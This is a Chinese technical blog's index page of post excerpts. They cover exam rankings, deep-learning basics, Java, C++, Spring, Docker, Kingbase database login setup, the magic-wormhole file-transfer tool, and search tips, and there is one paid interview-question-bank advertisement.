软考高级科目难度排行榜 1、系统规划与管理师
2、信息系统项目管理师
3、系统架构设计师
4、网络规划设计师
5、系统分析师
**注意：**不同的人对科目的难度感受可能会不一样，以上排名仅代表一般情况下的难度排序，具体难度还要根据个人实际情况和兴趣偏好来判断。
软考高级科目推荐 既然称之为高级科目，它必定是有一些难度的。那么，想要报考软考高级的同学，应该如何选取适合自己的科目呢？
对于没有计算机背景的小白：推荐选择信息系统项目管理师（高项）作为入门科目。因为这个科目涵盖了项目管理的多个领域，可以帮助小白快速了解计算机领域的基本知识和技能。
对于有计算机背景的同学：推荐选择系统架构设计师作为入门科目。这个科目包含计算机领域的核心课程，可以帮助大家深入了解计算机领域的知识和技能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdcf650e6057200f0cb8139ffe8511a2/" rel="bookmark">
			深度学习（Deep Learning） 简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习（Deep Learning）
深度学习在海量数据情况下的效果要比机器学习更为出色。
多层神经网络模型
神经网络 有监督机器学习模型
输入层隐藏层 (黑盒)输出层 概念:
神经元 Neuron A^(n+1)网络权重 Weights W^n偏移 bias b^n 激活函数:
ReLUtanhSigmoid 点击查看激活函数详情: https://blog.csdn.net/galoiszhou/article/details/135154697
监督类机器学习模型的目标就是在给定一个任务的情况下，找到最优化的参数，使得 Loss 损失值最小，其中 Loss 损失值就是预测结果和真实结果之间的误差。
神经网络的目标就是在给定一个任务的情况下，找到最优的Weights 和 bias，使得 Loss 最低。
CNN 图像识别这项技术已经发展得很成熟，卷积神经网络（Convolutional Neural Networks，CNN）又是其中的主流技术
神经网络 输入层隐藏层 特征提取层 卷积层激活函数池化层 全连接层 输出层 CNN 任意一张彩色图片都可以表示成一个三阶张量，即三维数组。所有彩色图像都是由红、绿、蓝（RGB）叠加而成的.
CNN 网络模型的数据输入就是将彩色图像分解为 R、G、B 这 3 个通道，其中每个通道的值都在 0 到 255 之间。
过滤掉干扰信息，并且识别图像中的主体信息, 做法就是不断模糊化一张图片. 通过 CNN 的卷积和池化来实现
在完成各层的卷积运算后，深度学习模型还需要进行非线性的变换，非线性的变换是通过增加激活函数来实现的，通过激活函数将“线性回归”拟合的直线编程曲线.
池化的目的也是提取特征，减少向下一阶段传递的数据量，池化过程的本质是“丢弃”，即只保留图像主体特征，过滤掉无关信息的数据特征。
CNN 的所有卷积和池化操作都是在提取特征，直到全连接层才进入真正的训练学习阶段，做最后的分类计算。
在 CNN 中，全连接层一般是用的是 Softmax 函数来进行分类.
深度学习的优点:
可以拟合任意复杂的数据分布性能好 深度学习的缺点:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cdcf650e6057200f0cb8139ffe8511a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aec507a9df65794f90c7e4e6f57de8da/" rel="bookmark">
			Java日期和时间学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		获取当月的第一天和最后一天
import java.util.Calendar; public class Main { public static void main(String[] args) { Calendar calendar = Calendar.getInstance(); int year = calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH); // 获取当月第一天 calendar.set(year, month, 1); String firstDayOfMonth = String.format("%04d-%02d-%02d", year, month + 1, 1); // 获取当月最后一天 calendar.set(Calendar.DAY_OF_MONTH, calendar.getActualMaximum(Calendar.DAY_OF_MONTH)); String lastDayOfMonth = String.format("%04d-%02d-%02d", year, month + 1, calendar.get(Calendar.DAY_OF_MONTH)); System.out.println("当月第一天：" + firstDayOfMonth); System.out.println("当月最后一天：" + lastDayOfMonth); } } 获取当前周的第一天和最后一天
import java.time.DayOfWeek; import java.time.LocalDate; import java.time.temporal.TemporalAdjusters; public class Main { public static void main(String[] args) { LocalDate today = LocalDate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aec507a9df65794f90c7e4e6f57de8da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f56d4e030dd4af1f9f2302c7db1d38e7/" rel="bookmark">
			Jetson设备打包Docker镜像和打包为tar.gz格式直接打包到硬盘，联想昭阳笔记本使用u盘安装Ubuntu开机报错faild systemctl status user@121.service
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker打包 sudo docker save -o dustynv_audiocraft:r35.4.1 dustynv/audiocraft:r35.4.1 注意这个需要本机空间充足的情况下才能打包，如果空间不够了是无法打包的/var/lib会占用大量空间，可以尝试把docker迁移到ssd,具体的步骤看下docker迁移那个文章，
tar文件夹打包 以打包jetson-containers/data/models/text-generation-webui下的模型文件为例： TheBloke_Llama-2-70b-Chat-GPTQ/
sudo tar -zcf /media/nvidia/1/TheBloke_Llama-2-70b-Chat-GPTQ.tar.gz TheBloke_Llama-2-70b-Chat-GPTQ/ 联想昭阳笔记本使用u盘安装Ubuntu开机报错faild systemctl status user@121.service Windows: 使用 Rufus 创建 Ubuntu 安装 U盘 下面我们将演示如何使用 Rufus 在 Windows 中创建可启动 Ubuntu 安装 U盘：
1做好以下准备工作：
大空间 U 盘一台 Windows PC下载最新版本 Rufus 启动盘制作工具下载好的 Ubuntu ISO 文件 2打开 Rufus 工具——在「设备」下拉列表中选好要使用的 U 盘——点击「选择」按钮指定下载好的 Ubuntu ISO 文件。
3其它选项都可以不用改，然后点击「开始」按钮。Rufus 会提示检测到 Ubuntu ISO 是 ISOHybrid 镜像，表示可以直接用于用作 DVD 和 USB 存储设备的源，而无需进行转换。
4选择「以 ISO 镜像 模式写入」——点击「OK」按钮。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f56d4e030dd4af1f9f2302c7db1d38e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a362b9595446ca59e44d958372f3fd5/" rel="bookmark">
			AI一叶知秋：从目标检测部署浅谈人工智能发展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔者写这篇文章也有讨巧之嫌，仅以个人视角分享一些看法，主要从实践部署来谈谈近两年来计算机视觉模型的变化，不过AI是一个宏大的话题，每个人定义的人工智能就不一样，我们先来探讨一下何为人工智能。百度百科中是这样定义的：
人工智能是研究、开发用于模拟、延伸和扩展人的智能的理论、方法、技术及应用系统的一门新的技术科学，它企图了解智能的实质，并生产出一种新的能以人类智能相似的方式做出反应的智能机器，该领域的研究包括机器人、语言识别、图像识别、自然语言处理和专家系统等。
而我又询问了文心一言和GPT，文心一言回答得更加全面，补充了百科中模糊的部分，而GPT从自身角度回答了什么是人工智能。
文心一言：人工智能的基本原理是通过算法和模型来模拟人类的智能行为。算法是计算机程序执行任务所遵循的一组规则和指令。模型则是基于数据和算法构建的，用于模拟人类智能行为的系统或平台。通过训练和优化模型和算法，人工智能系统可以逐渐学习和掌握各种复杂的任务和技能，从而实现自主决策和行动。人工智能的应用非常广泛，例如：
机器学习：通过训练大量数据来使计算机自主地进行决策和预测。自然语言处理：使计算机能够理解和生成人类语言。计算机视觉：使计算机能够解释和理解图像和视频。语音识别：将人类的语音转换为文本或命令。专家系统：在特定领域内提供类似人类专家的建议和决策支持。机器人技术：设计和制造能够自主行动和决策的机器人。 GPT：作为一个人工智能，我被设计用来处理和理解大量的信息，并且可以执行特定任务。人工智能是指通过模拟人类智力的技术来实现某种形式的感知、学习、推理和决策能力。这些技术包括机器学习、深度学习、自然语言处理等，使得计算机系统能够展现出类似于人类的智能行为。 可以看到有些关键词重复出现了多次，如模型、模拟、能力，那我们简单抽象得出一个概念：人工智能的就是用算法模型来模拟人类能力，那么它的发展趋势也就是接近人甚至超越人。尽管我认为人工智能的含义应该包揽所有的自动化智能化，乃至一切通过电路、信号来便利生活的产物。但不得不说在这个抽象化的概念下，神经网络或者更具体的卷积神经网络完美契合了这几个关键词，至少从字面以上来看，像是一个仿生学词汇，而我们刚才得出的结论，人工智能不就是模仿人的行为吗。 所以神经网络衍生出的几个研究领域自然成为了人工智能的大热门，例如计算机视觉、自然语言处理、深度强化学习等。近几年来不断更迭，推陈出新，在各大媒体平台都能看见这几位的身影，然而现在我要泼一盆凉水，就拿我从事过的目标检测来说，对比GPT这类成功的自然语言处理工具，在实用性上还有很长的路要走。
我的工作是部署目标检测模型来识别灯条和数字，相较于各种人脸识别地图识别来说比较简单，先前我也写过一篇文章记叙了目标检测模型的发展，详见http://t.csdnimg.cn/xB48c
而我刚开始学习目标检测时接触到的并不是文中的Region-CNN或是Overfeat模型，而是百度飞桨上的手写数字识别MNIST数据集，许多项目都是围绕着这个数据集建立模型，或者说不上建立，更像是自己凭感觉修改成熟架构的几个参数然后不断微调，当然初学者更多是照搬原模型，我记得自己用vgg16跑了很多次数字识别，后来又试过resnet50，即使始终不会调参，但是创建数据集并用各种标注软件画框却练得炉火纯青。那时候SOTA模型还没有那么深入人心，最开心的事情就是在colab上对网络一通瞎搞碰巧提高了准确率。
后来为了速度和精确接触了YOLO系列，从v3，v5再到v8，效果越来越好，但是部署的难度也在提升。就拿resnet来说，作为一个18层的小模型，使用CPU速度就足够了，但是对于YOLO来说，帧率可能只有十几hz，不用说商业化，仅是在robomaster赛场都不堪重用。于是CUDA、Tensorrt等加速软硬件就显得格外重要，那时候还研究过英伟达的NCS和谷歌的TPU，感觉并不怎么合适。
我们面临的最重要的一个问题是大家都是编写一个py文件然后装上GPU驱动跑数据，很少有人真的把模型封装在一个单片机里，然后加上足够多的外设，就像终结者里面能跑能跳自动追踪的机器人一样。所以训练好了模型，怎么部署就令人头疼。我们先是将pth文件通过Protobuf序列化成onnx文件，再使用NVIDIA的API转为engine，在这之后根据github上开源的一些仓库创建了接口，使得图像数据可以送达至模型并输出结果。这个过程还要创建编写py、json、txt、xml、h、cu、cpp、wts等一大堆眼花缭乱的文件，最后的结果也不一定稳定，可能外接的相机光圈有些变化就会报出一串error。
所以说尽管模型的架构不断完善，许多云平台或者是开源仓库让一窍不通的小白也能顺利完成训练并得到满意的结果，我仍然持有一个审慎的看法，先前在小木虫有看到过一个类似的帖子，大意是各大厂商不断发力纷纷推出自家的SOTA模型，但是研究生除了根据这些模型改改参数更加贴近外，是做不了实际工业项目的，他们实验室里有一个祖传横向是一个图像分割的传送带监控，用的还是七八年前的模型，因为既没有人关注这些不随大流发展人机对话而是负责特定用途的小众模型，也没有人想要优化一个需要连接电路处理信号避免干扰的实际部署器件。这实际上就反映了深度学习能否真正发挥效用的进一步难题——当大家都飞在云端时，有没有人愿意停下来回到地面呢。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a33ca079c955400661cb79b3d7f49c18/" rel="bookmark">
			[C&#43;&#43;] 多态(上) -- 抽象类、虚函数、虚函数表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、多态的概念2、多态的定义及实现2.1 多态的构成条件2.2 虚函数2.3 虚函数的重写2.4 虚函数重写的两个例外2.4.1 协变(基类与派生类虚函数返回值类型不同) 2.4.2 析构函数的重写(基类与派生类析在这里插入图片描述2.4.3 选择题测试 2.5 C++11 final 和 override2.5.1 final2.5.2 override 2.6 重载、覆盖(重写)、隐藏(重定义)的对比 3、抽象类3.1 什么是抽象类3.2 接口继承和实现接口 4、虚函数表 1、多态的概念 通俗来说，多态就是多种形态，具体点就是去完成某个行为，当不同的对象去完成时会产生出不同的状态。
举个栗子：比如买票这个行为：
当普通人买票时，是全价买票；
学生买票时，是半价买票；
军人买票时是优先买票。
这个例子就是多态，不同身份对应不同的票价。
2、多态的定义及实现 2.1 多态的构成条件 在继承中要构成多态有两个重要条件：
必须通过 基类的指针或者引用调用虚函数派生类必须对基类的虚函数进行重写（重写的要求三同：返回值相同、函数名相同、参数列表相同）
我们按照多态的条件来写一份多态的代码： class Person { public: virtual void BuyTicket() { cout &lt;&lt; "买票全价" &lt;&lt; endl; } }; class Student : public Person { virtual void BuyTicket() { cout &lt;&lt; "买票半价" &lt;&lt; endl; } }; void func(Person&amp; p) { p.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a33ca079c955400661cb79b3d7f49c18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/401251266c0faa3dd8dd741156dd1bfb/" rel="bookmark">
			pake协议传输文件magic-wormhole
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pake协议传输文件magic-wormhole 1 magic-wormhole简介其他介绍 2 安装magic-wormhole3 使用示范发送文件指定虫洞码长度 接收文件 1 magic-wormhole简介 16.7k star 强推，丝滑、简洁、安全的开源工具——magic-wormhole
项目地址：https://github.com/magic-wormhole/magic-wormhole
python写的基于PAKE协议的公网文件传输工具，可以安全的将文件从一台计算机传输到另外一台计算机 特点在于安全、简洁
其他介绍 magic-wormhole工具使用PAKE“密码身份验证密钥交换”，这是一系列加密算法，使用短的低熵密码来建立强大的高熵共享密钥。
然后，此密钥可用于加密数据。magic-wormhole使用SPAKE2算法。
PAKE 有效地权衡了交互与离线攻击。网络攻击者了解共享密钥的唯一方法是在初始连接尝试期间执行中间人攻击，并正确猜测双方正在使用的代码。
他们这样做的机会与虫洞代码的熵成反比。默认设置是使用 16 位代码（使用 –code-length= 更改此设置），因此每次使用该工具，攻击者都有 1/65536 的成功机会。
因此，在攻击者有合理的成功机会之前，用户可以期望看到许多错误消息。
该程序没有任何内置超时，但是预计两个客户端将在一小时左右的时间内运行。
这使得该工具对于已经进行实时对话并希望逐步建立安全连接的人最有用。在传输完成之前，两个客户端都必须保持运行状态。
2 安装magic-wormhole github可以访问的直接到如下链接去看源码，支持多环境 如果有python环境，直接pip安装magic-wormhole就好
# 安装magic-wormhole pip3 install magic-wormhole 3 使用示范 发送文件 安装完成对应的组件后，在发送端执行发送命令，会生成虫洞码。
该程序没有任何内置超时，但是预计两个客户端将在一小时左右的时间内运行。
# 发送文件 wormhole send 文件名 执行完命令后，进入等待发送状态，不要退出这个命令行
指定虫洞码长度 # 发送文件 ## -c 指定虫洞码长度 wormhole send -c 虫洞码长度 文件名 接收文件 会生成对应另外一台电脑的操作命令如下：
# 接收文件 wormhole receive 虫洞码 另外一台接收端执行对应命令,输入y后，正常传输
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e8197e028de74913cdaa2112cd307c4/" rel="bookmark">
			KingbaseV8R6单实例定时全量备份步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		此场景为单机数据库节点内部备份，方便部署和操作，但备份REPO与数据库实例处于同一个物理主机，冗余度较低。
前期准备 配置ksql免密登录(必须) 在Kingbase数据库运行维护中，经常用到ksql工具登录数据库，本地免密登录可以让维护数据库时，摆脱每次登库输入用户名密码；下面介绍KingbaseES V8数据库2种配置免密登录的方法。
ksql登录时，会去数据库安装用户家目录下的密码文件.encpwd中读取账户，从而登入数据库；密码文件为普通文本文件，可以vi创建，也可以使用kingbase提供的工具sys_encpwd工具来生成密码文件。
本案例采用system用户做演示，若需其他用户视情况更改。
.encpwd内容解析 每一行代表一条访问规则记录，可以配置多条记录；每条记录包含5个字段，字段与字段之间用冒号“：”分隔，5个字段分别为：主机地址、端口号、库名、用户名、密码（加密格式）；
.encpwd若不存在会创建，若已存在，会追加记录。
例：
127.0.0.1:54321:test:u1:MTIzNDU2 sys_encpwd配置工具使用方法 该工具包含5个参数，5个参数均需要输入才能配置成功
参数说明：
-H, --hostname=主机地址，允许单主机地址匹配和全匹配，全匹配时使用*指定 -P, --portnum=端口号，仅允许单端口匹配 -D, --database=数据库名，允许单数据库匹配和全匹配，全匹配时使用*指定 -U, --user=用户名，仅允许单用户匹配 -W, --password=用户对应的密码，仅允许单用户匹配 注意：当前四个参数输入与原文件中的某一条记录完全相同时，会修改该条记录相应的密码，否则生成一条新的记录。
示例1：将新创建用户登录信息加入密码文件 --创建用fuwa并指定密码，用ksql测试登录需要输入密码 [kingbase@node1 ~]$ ksql -Usystem -W test 口令： ksql (V8.0) 输入 "help" 来获取帮助信息. test=# create user fuwa with password 'fuwa'; CREATE ROLE test=# \q [kingbase@node1 ~]$ ksql -Ufuwa test ksql (V8.0) 输入 "help" 来获取帮助信息. test=&gt; --使用sys_encpwd工具配置密码，指定fuwa用户可以从任意主机、任意端口，登录任意数据库 [kingbase@node1 ~]$ sys_encpwd -H \* -P \* -D \* -U fuwa -W fuwa [kingbase@node1 ~]$ cat .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e8197e028de74913cdaa2112cd307c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8878cf42aef9d9d8231a58a55d20dbd2/" rel="bookmark">
			java通用实现List＜自定义对象＞中指定字段和指定排序方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Person类：
/** * @date 2023/12/19 11:20 */ public class Person { private String name; private String sex; public Person() { } public Person(String name, String sex) { this.name = name; this.sex = sex; } public String getName() { return name; } public String getSex() { return sex; } public void setName(String name) { this.name = name; } public void setSex(String sex) { this.sex = sex; } } 工具类：
import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8878cf42aef9d9d8231a58a55d20dbd2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/655d38bd2ce29e79309db09af9279521/" rel="bookmark">
			去阿里了，真的很好！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是来自栈长一个粉丝的反馈：
栈长这几年一直坚持在运营这个Java面试库，能帮到他这么多，我也很欣慰，也让我觉得很有意义在做一件事情。
Java面试库从 0 一直更新到现在 2500+，几乎覆盖了所有主流面试题，还有大厂面试真题，支持自测练习，花费我巨量心血，堪称面试速成神器！
如果你还没用过这个Java面试库，我一定要推荐给你：
题库中的内容都是我工作这么多年，以及写博客、写公众号、写书这么多年积累的精华，已经不仅仅是面试题了。
不要再找乱七八糟的面试题了，浪费时间不说，还会被误导。今年这情况。。。就当多一手准备吧！
最近又有粉丝报喜了：
Java面试库小程序运营以来，像这样的反馈实在太多了，其中也帮助许多粉丝进入大厂，这也让我觉得很有意义在做的一件事情，很欣慰，也很有成就感。
普通用户有积分限制，赞赏栈长升级 VIP 可以免积分无限制刷题，首年 199 元，续期只要 99 元 / 年，花点小钱，让你面试年年无忧，好东西就得付费。
如需升级 VIP 请联系栈长微信：
请备注：VIP，不然不会通过
精心原创（2500+） 题库不是网上东拼西凑的，网上的太乱了，很多过时了，答案太粗糙又有误导性。
栈长花了大量时间创作Java面试库：
1）分析了大量的技术原理，画了大量的原理图、流程图，还包含大量的编程案例；
2）包含阿里、腾讯、百度、美团等大厂必问的面试题，已经帮助很多粉丝进入大厂；
来几张呕心沥血创作的截图：
现在已经更新 2500+ 了，涉及方方面面，没有你看不到的，只有你想不到的，栈长长期维护，并且还在持续更新…
我敢说，题库价值远超门票价值 100+ 倍，不要和网上的对比，那只会浪费你的时间。
不被误导 不被网上乱七八糟的答案误导：
题库都经过栈长严格的确认、实战测试，并且还加入了粉丝的建议反馈，在大量粉丝审视下，哪怕有一个错别字，都会被纠正。
只要大家反馈了问题，栈长都会亲自核实和纠正，不断更新和完善题库，让大家少走弯路。
粉丝评价 好评如潮，就不一一展示了，感谢大家的支持和认可。
Java面试库已经帮助许多粉丝进入大厂，找工作更是小菜一碟。
早刷题，早学习，早进步，早涨薪～～
点击体验Java面试库小程序：
普通用户有积分限制，赞赏栈长升级 VIP 可以免积分无限制刷题，首年 199 元，续期只要 99 元 / 年，花点小钱，让你面试年年无忧，好东西就得付费。
如需升级 VIP 请联系栈长微信：
请备注：VIP，不然不会通过
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9829b1cb20c38274b265b4a3681cef0/" rel="bookmark">
			idea切换分支报.idea文件 untracked commit them before checkout
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当你在使用 IntelliJ IDEA 或其他 JetBrains 产品进行开发时，切换分支时出现 .idea 文件是未追踪的更改（untracked changes）的错误提示，通常是因为 .idea 目录中的文件没有被 Git 追踪。
.idea 目录是 IntelliJ IDEA 的项目配置文件和缓存目录，它不应该被提交到版本控制系统中，因此默认情况下它会被 Git 忽略。但是，如果你不小心将它添加到了版本控制中，就会出现未追踪的更改的问题。
要解决这个问题，你可以按照以下步骤操作：
确保 .idea 目录被 Git 忽略：
打开项目根目录下的 .gitignore 文件，确保其中包含了 .idea 目录。如果没有，你可以添加以下内容：
.idea/
保存并关闭 .gitignore 文件。
2. 确认未追踪的更改：
在 IntelliJ IDEA 中，打开 “VCS” 菜单，然后选择 “Git” -&gt; “Untracked” 或 “Uncommitted Changes”。检查是否有 .idea 目录下的文件被标记为未追踪的更改。
3. 处理未追踪的更改：
如果你确定不需要保留 .idea 目录下的未追踪更改，你可以选择丢弃它们。在 “VCS” 菜单中选择 “Git” -&gt; “Discard Changes” 或 “Reset Current Branch to Here”，然后选择 “.idea” 目录进行丢弃。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9829b1cb20c38274b265b4a3681cef0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65d967b891a3debca3da8b85cbcfdbf0/" rel="bookmark">
			微信小程序实现一个todolist这样的小demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小程序实现todolist 下面是一个简单的待办事项清单应用的示例，它包括添加任务、完成任务和删除任务的功能。
app.json 文件中
{ "pages": [ "pages/index/index", "pages/todoList/todoList" ], "window": { "navigationBarTitleText": "Todo List" } } 创建 pages/todoList/todoList.js 文件
Page({ data: { todoList: [] }, onLoad: function() { this.loadTodoList(); }, loadTodoList: function() { // 从本地存储中加载待办事项列表 const todoList = wx.getStorageSync('todoList'); if (todoList) { this.setData({ todoList: JSON.parse(todoList) }); } }, addTodo: function(e) { const value = e.detail.value; if (value) { const todo = { id: new Date().getTime(), content: value, completed: false }; const todoList = [.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65d967b891a3debca3da8b85cbcfdbf0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8762ef4943f4b14c28753b89e78065e/" rel="bookmark">
			MySQL报错：1054 - Unknown column ‘xx‘ in ‘field list的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我在操作MySQL遇到1054报错，报错内容：1054 - Unknown column 'Cindy' in 'field list'，下面演示解决方法，非常简单。
根据箭头指示，Cindy对应的应该是VARCHAR文本数字类型，字符串要用引号，所以解决方法是加上引号。如图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2b1a0f17e9c5e12e0908d72eac606c1/" rel="bookmark">
			IDEA、Pycharm的前进、后退添加到工具栏以及快捷键的设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、添加前进和后退快捷键到工具栏
IDEA安装后，前进和后退快捷按钮默认不在工具栏显示，需要手动将其添加到工具栏。
1.1、File→Setting
1.2、按照图一选中Toolbar Run Actions ，点击右上角的+号，Appearance &amp; Behavior→Menus and Toolbars→Navigate Bar Toolbar
1.3、如下图所示，ctrl同时选中前进和后退，点击确定
2、前进和后退快捷键设置
2.1、File→Setting
2.2、如下图所示，找到前进和后退的快捷键设置，keymap→Main menu→navigate
2.3、如下图所示，选择对应的按钮，鼠标右键添加或删除快捷键
2.4 重启idea，如下出现
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc0e11962433cca3ea3bc711879e28e0/" rel="bookmark">
			spring-kafka通过@KafkaListener实现消费者监听流程分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 主流程处理EnableKafka注解实现BeanPostProcessor接口postProcessAfterInitialization扫描@KafkaListenerregisterListenerContainer注册监听concurrency参数决定线程数开启ListenerConsumer线程run方法调用kafka的poll方法拉取消息 流程图 主流程 处理EnableKafka注解 首先通过@EnableKafka注解，注入KafkaBootstrapConfiguration类
@Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented // @Import是spring提供的注入类的方式 @Import(KafkaBootstrapConfiguration.class) public @interface EnableKafka { } 再注入KafkaListenerAnnotationBeanPostProcessor
@Configuration public class KafkaBootstrapConfiguration { @SuppressWarnings("rawtypes") @Bean(name = KafkaListenerConfigUtils.KAFKA_LISTENER_ANNOTATION_PROCESSOR_BEAN_NAME) @Role(BeanDefinition.ROLE_INFRASTRUCTURE) public KafkaListenerAnnotationBeanPostProcessor kafkaListenerAnnotationProcessor() { // 注入KafkaListenerAnnotationBeanPostProcessor return new KafkaListenerAnnotationBeanPostProcessor(); } @Bean(name = KafkaListenerConfigUtils.KAFKA_LISTENER_ENDPOINT_REGISTRY_BEAN_NAME) public KafkaListenerEndpointRegistry defaultKafkaListenerEndpointRegistry() { return new KafkaListenerEndpointRegistry(); } } 实现BeanPostProcessor接口 可以看到KafkaListenerAnnotationBeanPostProcessor实现了BeanPostProcessor，那自然存在postProcessBeforeInitialization和postProcessAfterInitialization两个关键方法
public class KafkaListenerAnnotationBeanPostProcessor&lt;K, V&gt; implements BeanPostProcessor, Ordered, BeanFactoryAware, SmartInitializingSingleton { // 代码省略... } postProcessAfterInitialization扫描@KafkaListener @Override public Object postProcessAfterInitialization(final Object bean, final String beanName) throws BeansException { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc0e11962433cca3ea3bc711879e28e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dca95abbb7afabeb8e35502334aebe51/" rel="bookmark">
			SpringAOP中@EnableAspectJAutoProxy注解的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言从注解开始Import注解封装对象、注入容器 AnnotationAwareAspectJAutoProxyCreator的作用类图回顾IOC对象初始化后置处理器 总结 前言 如果要使用SpringAOP的功能，必须要添加一个@EnableAspectJAutoProxy注解，有了这个注解才能支持@Aspect等相关的一系列AOP注解的功能，这个注解就相当于在传统的xml配置文件中添加 &lt;aop:aspectj-autoproxy&gt;一样。
在学习SpringAOP相关的知识之前，建议一定要先搞清楚IOC相关的知识，如果不清楚的可以先阅读Spring专栏中IOC系列的文章。
从注解开始 接下来就来看一下@EnableAspectJAutoProxy注解到底做了什么？
@Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Import(AspectJAutoProxyRegistrar.class) public @interface EnableAspectJAutoProxy { /** * Indicate whether subclass-based (CGLIB) proxies are to be created as opposed * to standard Java interface-based proxies. The default is {@code false}. */ boolean proxyTargetClass() default false; /** * Indicate that the proxy should be exposed by the AOP framework as a {@code ThreadLocal} * for retrieval via the {@link org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dca95abbb7afabeb8e35502334aebe51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52acaa6205dd3d11e37ca65716568769/" rel="bookmark">
			JavaScript：Array数组去重
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单数组
1.利用Array.from(new Set)去重： let list = [1,2,3,4,5,5,5,6] let newList = Array.from(new Set(list)) console.log('newList &gt;&gt; ', newList); 2.利用includes去重 let list = [1,2,3,4,5,5,5,6] let newList = [] list.forEach((item) =&gt; { if (!newList.includes(item)) { newList.push(item) } }) console.log('newList &gt;&gt;&gt; ', newList) 3.利用map去重 let list = [1,2,3,4,5,5,5,6] let newList = [] let map = new Map() list.forEach((item) =&gt; { if (!map.has(item)) { map.set(item, ture) newList.push(item) } }) console.log('newList &gt;&gt;&gt; ', newList) 4.利用indexOf去重 let list = [1,2,3,4,5,5,5,6] let newList = [] let map = new Map() list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52acaa6205dd3d11e37ca65716568769/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c760b7862e8e23c5fc92dc8b5b90fe03/" rel="bookmark">
			【git】补充commit到上一次的提交中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git amend
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac24fb9ba31d69493dd3b2f5e37ecba3/" rel="bookmark">
			常用的搜索技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		搜索技巧 常用搜索的4大类需求搜索网页快照cache限定关键词限定标题intitle限定标题+限定关键词限定标题多个关键词 限定内容关键词限定搜索结果的网址限定网址来源--站内搜索限定图片尺寸限定文件格式产品经理导航网址 关于如何基于，know sth\learn sth \ create sth \ do sth，去搜索信息资讯、知识技能、素材文件、工具软件等等
常用搜索的4大类需求 信息咨询只是技能素材文件工具软件 搜索网页快照cache 有些Google搜索结果不提供快照，可以使用cache指令获取快照。
